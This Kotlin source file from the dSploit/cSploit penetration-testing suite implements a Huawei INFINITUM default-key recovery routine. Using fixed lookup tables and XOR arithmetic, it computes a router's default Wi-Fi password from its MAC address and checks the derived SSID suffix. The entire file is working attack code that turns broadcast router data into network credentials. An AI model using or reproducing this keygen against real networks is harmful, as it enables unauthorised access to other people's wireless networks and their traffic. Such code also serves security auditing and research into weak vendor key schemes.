/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.strix.data.wifi.algorithms

import org.csploit.strix.data.wifi.Keygen

/**
 * Huawei INFINITUM key recovery algorithm.
 * http://websec.ca/blog/view/mac2wepkey_huawei
 */
class HuaweiKeygen(
    ssid: String, mac: String, level: Int, enc: String
) : Keygen(ssid, mac, level, enc) {

    private val ssidIdentifier: String = ssid.substring(ssid.length - 4)

    // @formatter:off
    private val a0  = intArrayOf(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    private val a1  = intArrayOf(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15)
    private val a2  = intArrayOf(0, 13, 10, 7, 5, 8, 15, 2, 10, 7, 0, 13, 15, 2, 5, 8)
    private val a3  = intArrayOf(0, 1, 3, 2, 7, 6, 4, 5, 15, 14, 12, 13, 8, 9, 11, 10)
    private val a4  = intArrayOf(0, 5, 11, 14, 7, 2, 12, 9, 15, 10, 4, 1, 8, 13, 3, 6)
    private val a5  = intArrayOf(0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12)
    private val a6  = intArrayOf(0, 1, 3, 2, 6, 7, 5, 4, 12, 13, 15, 14, 10, 11, 9, 8)
    private val a7  = intArrayOf(0, 8, 0, 8, 1, 9, 1, 9, 2, 10, 2, 10, 3, 11, 3, 11)
    private val a8  = intArrayOf(0, 5, 11, 14, 6, 3, 13, 8, 12, 9, 7, 2, 10, 15, 1, 4)
    private val a9  = intArrayOf(0, 9, 2, 11, 5, 12, 7, 14, 10, 3, 8, 1, 15, 6, 13, 4)
    private val a10 = intArrayOf(0, 14, 13, 3, 11, 5, 6, 8, 6, 8, 11, 5, 13, 3, 0, 14)
    private val a11 = intArrayOf(0, 12, 8, 4, 1, 13, 9, 5, 2, 14, 10, 6, 3, 15, 11, 7)
    private val a12 = intArrayOf(0, 4, 9, 13, 2, 6, 11, 15, 4, 0, 13, 9, 6, 2, 15, 11)
    private val a13 = intArrayOf(0, 8, 1, 9, 3, 11, 2, 10, 6, 14, 7, 15, 5, 13, 4, 12)
    private val a14 = intArrayOf(0, 1, 3, 2, 7, 6, 4, 5, 14, 15, 13, 12, 9, 8, 10, 11)
    private val a15 = intArrayOf(0, 1, 3, 2, 6, 7, 5, 4, 13, 12, 14, 15, 11, 10, 8, 9)
    private val n1  = intArrayOf(0, 14, 10, 4, 8, 6, 2, 12, 0, 14, 10, 4, 8, 6, 2, 12)
    private val n2  = intArrayOf(0, 8, 0, 8, 3, 11, 3, 11, 6, 14, 6, 14, 5, 13, 5, 13)
    private val n3  = intArrayOf(0, 0, 3, 3, 2, 2, 1, 1, 4, 4, 7, 7, 6, 6, 5, 5)
    private val n4  = intArrayOf(0, 11, 12, 7, 15, 4, 3, 8, 14, 5, 2, 9, 1, 10, 13, 6)
    private val n5  = intArrayOf(0, 5, 1, 4, 6, 3, 7, 2, 12, 9, 13, 8, 10, 15, 11, 14)
    private val n6  = intArrayOf(0, 14, 4, 10, 11, 5, 15, 1, 6, 8, 2, 12, 13, 3, 9, 7)
    private val n7  = intArrayOf(0, 9, 0, 9, 5, 12, 5, 12, 10, 3, 10, 3, 15, 6, 15, 6)
    private val n8  = intArrayOf(0, 5, 11, 14, 2, 7, 9, 12, 12, 9, 7, 2, 14, 11, 5, 0)
    private val n9  = intArrayOf(0, 0, 0, 0, 4, 4, 4, 4, 0, 0, 0, 0, 4, 4, 4, 4)
    private val n10 = intArrayOf(0, 8, 1, 9, 3, 11, 2, 10, 5, 13, 4, 12, 6, 14, 7, 15)
    private val n11 = intArrayOf(0, 14, 13, 3, 9, 7, 4, 10, 6, 8, 11, 5, 15, 1, 2, 12)
    private val n12 = intArrayOf(0, 13, 10, 7, 4, 9, 14, 3, 10, 7, 0, 13, 14, 3, 4, 9)
    private val n13 = intArrayOf(0, 1, 3, 2, 6, 7, 5, 4, 15, 14, 12, 13, 9, 8, 10, 11)
    private val n14 = intArrayOf(0, 1, 3, 2, 4, 5, 7, 6, 12, 13, 15, 14, 8, 9, 11, 10)
    private val n15 = intArrayOf(0, 6, 12, 10, 9, 15, 5, 3, 2, 4, 14, 8, 11, 13, 7, 1)
    private val n16 = intArrayOf(0, 11, 6, 13, 13, 6, 11, 0, 11, 0, 13, 6, 6, 13, 0, 11)
    private val n17 = intArrayOf(0, 12, 8, 4, 1, 13, 9, 5, 3, 15, 11, 7, 2, 14, 10, 6)
    private val n18 = intArrayOf(0, 12, 9, 5, 2, 14, 11, 7, 5, 9, 12, 0, 7, 11, 14, 2)
    private val n19 = intArrayOf(0, 6, 13, 11, 10, 12, 7, 1, 5, 3, 8, 14, 15, 9, 2, 4)
    private val n20 = intArrayOf(0, 9, 3, 10, 7, 14, 4, 13, 14, 7, 13, 4, 9, 0, 10, 3)
    private val n21 = intArrayOf(0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15)
    private val n22 = intArrayOf(0, 1, 2, 3, 5, 4, 7, 6, 11, 10, 9, 8, 14, 15, 12, 13)
    private val n23 = intArrayOf(0, 7, 15, 8, 14, 9, 1, 6, 12, 11, 3, 4, 2, 5, 13, 10)
    private val n24 = intArrayOf(0, 5, 10, 15, 4, 1, 14, 11, 8, 13, 2, 7, 12, 9, 6, 3)
    private val n25 = intArrayOf(0, 11, 6, 13, 13, 6, 11, 0, 10, 1, 12, 7, 7, 12, 1, 10)
    private val n26 = intArrayOf(0, 13, 10, 7, 4, 9, 14, 3, 8, 5, 2, 15, 12, 1, 6, 11)
    private val n27 = intArrayOf(0, 4, 9, 13, 2, 6, 11, 15, 5, 1, 12, 8, 7, 3, 14, 10)
    private val n28 = intArrayOf(0, 14, 12, 2, 8, 6, 4, 10, 0, 14, 12, 2, 8, 6, 4, 10)
    private val n29 = intArrayOf(0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3)
    private val n30 = intArrayOf(0, 15, 14, 1, 12, 3, 2, 13, 8, 7, 6, 9, 4, 11, 10, 5)
    private val n31 = intArrayOf(0, 10, 4, 14, 9, 3, 13, 7, 2, 8, 6, 12, 11, 1, 15, 5)
    private val n32 = intArrayOf(0, 10, 5, 15, 11, 1, 14, 4, 6, 12, 3, 9, 13, 7, 8, 2)
    private val n33 = intArrayOf(0, 4, 9, 13, 3, 7, 10, 14, 7, 3, 14, 10, 4, 0, 13, 9)
    private val keyTable = intArrayOf(30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 61, 62, 63, 64, 65, 66)
    private val ssidChars = charArrayOf('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f')
    // @formatter:on

    override fun getKeys(): List<String>? {
        if (this.mac.length != 12) {
            errorMessage = "The MAC address is invalid."
            return null
        }
        val m = IntArray(12) { Integer.parseInt(this.mac.substring(it, it + 1), 16) }

        val s1 = n1[m[0]] xor a4[m[1]] xor a6[m[2]] xor a1[m[3]] xor a11[m[4]] xor
                n20[m[5]] xor a10[m[6]] xor a4[m[7]] xor a8[m[8]] xor a2[m[9]] xor
                a5[m[10]] xor a9[m[11]] xor 5
        val s2 = n2[m[0]] xor n8[m[1]] xor n15[m[2]] xor n17[m[3]] xor a12[m[4]] xor
                n21[m[5]] xor n24[m[6]] xor a9[m[7]] xor n27[m[8]] xor n29[m[9]] xor
                a11[m[10]] xor n32[m[11]] xor 10
        val s3 = n3[m[0]] xor n9[m[1]] xor a5[m[2]] xor a9[m[3]] xor n19[m[4]] xor
                n22[m[5]] xor a12[m[6]] xor n25[m[7]] xor a11[m[8]] xor
                a13[m[9]] xor n30[m[10]] xor n33[m[11]] xor 11
        val s4 = n4[m[0]] xor n10[m[1]] xor n16[m[2]] xor n18[m[3]] xor a13[m[4]] xor
                n23[m[5]] xor a1[m[6]] xor n26[m[7]] xor n28[m[8]] xor a3[m[9]] xor
                a6[m[10]] xor a0[m[11]] xor 10

        val ssidFinal = "" + ssidChars[s1] + ssidChars[s2] + ssidChars[s3] + ssidChars[s4]

        val ya = a2[m[0]] xor n11[m[1]] xor a7[m[2]] xor a8[m[3]] xor a14[m[4]] xor
                a5[m[5]] xor a5[m[6]] xor a2[m[7]] xor a0[m[8]] xor a1[m[9]] xor
                a15[m[10]] xor a0[m[11]] xor 13
        val yb = n5[m[0]] xor n12[m[1]] xor a5[m[2]] xor a7[m[3]] xor a2[m[4]] xor
                a14[m[5]] xor a1[m[6]] xor a5[m[7]] xor a0[m[8]] xor a0[m[9]] xor
                n31[m[10]] xor a15[m[11]] xor 4
        val yc = a3[m[0]] xor a5[m[1]] xor a2[m[2]] xor a10[m[3]] xor a7[m[4]] xor
                a8[m[5]] xor a14[m[6]] xor a5[m[7]] xor a5[m[8]] xor a2[m[9]] xor
                a0[m[10]] xor a1[m[11]] xor 7
        val yd = n6[m[0]] xor n13[m[1]] xor a8[m[2]] xor a2[m[3]] xor a5[m[4]] xor
                a7[m[5]] xor a2[m[6]] xor a14[m[7]] xor a1[m[8]] xor a5[m[9]] xor
                a0[m[10]] xor a0[m[11]] xor 14
        val ye = n7[m[0]] xor n14[m[1]] xor a3[m[2]] xor a5[m[3]] xor a2[m[4]] xor
                a10[m[5]] xor a7[m[6]] xor a8[m[7]] xor a14[m[8]] xor a5[m[9]] xor
                a5[m[10]] xor a2[m[11]] xor 7

        addPassword(
            keyTable[ya].toString() + keyTable[yb].toString() +
                    keyTable[yc].toString() + keyTable[yd].toString() +
                    keyTable[ye].toString()
        )
        if (!ssidIdentifier.equals(ssidFinal, ignoreCase = true) &&
            this.ssid.startsWith("INFINITUM")
        ) {
            errorMessage = "The calculated SSID does not match the provided one."
        }
        return getResults()
    }
}
